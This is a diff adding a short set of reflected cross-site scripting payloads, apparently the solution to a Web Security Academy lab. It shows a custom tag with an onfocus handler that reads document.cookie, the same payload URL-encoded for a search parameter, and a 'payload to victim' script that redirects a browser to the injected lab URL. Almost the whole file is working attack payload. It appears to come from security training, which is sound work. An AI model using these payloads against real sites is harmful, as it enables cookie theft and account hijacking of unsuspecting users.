@@ -1,0 +1,9 @@
+<xss+id=x+onfocus=alert(document.cookie) tabindex=1>#x';
+
+?search=<xss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1>#x';
+
+payload to victim:
+
+<script>
+location='https://0a4200bf044023478436e7c3003a0075.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x;'
+</script>
